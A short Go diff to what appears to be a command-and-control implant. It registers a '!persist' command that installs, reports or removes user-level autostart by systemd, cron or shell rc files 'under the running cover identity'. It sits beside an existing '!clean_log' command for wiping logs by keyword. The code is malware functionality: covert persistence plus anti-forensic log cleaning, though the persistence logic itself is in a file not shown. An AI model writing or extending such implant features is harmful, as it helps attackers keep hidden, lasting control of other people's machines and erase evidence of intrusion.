@@ -20,6 +20,20 @@ func platformCommands(cmd *cobra.Command) {
 	}
 	cleanLogCmd.Flags().StringP("keyword", "k", "", "Keyword to clean logs")
 	cmd.AddCommand(cleanLogCmd)
+
+	// !persist [install|status|remove] --method <auto|systemd|cron|shellrc>
+	// Explicit operator-ordered persistence, never automatic: installs
+	// user-level autostart under the running cover identity. See
+	// persist_linux.go.
+	persistCmd := &cobra.Command{
+		Use:     def.C2CmdPersist,
+		Short:   "Persistence: install/status/remove user-level autostart",
+		Example: "!persist install --method auto | !persist status | !persist remove",
+		GroupID: "linux",
+		Run:     runPersist,
+	}
+	persistCmd.Flags().StringP("method", "m", "auto", "Persistence mechanism: auto|systemd|cron|shellrc")
+	cmd.AddCommand(persistCmd)
 }
 
 // runCleanLogLinux implements: !clean_log --keyword <keyword>
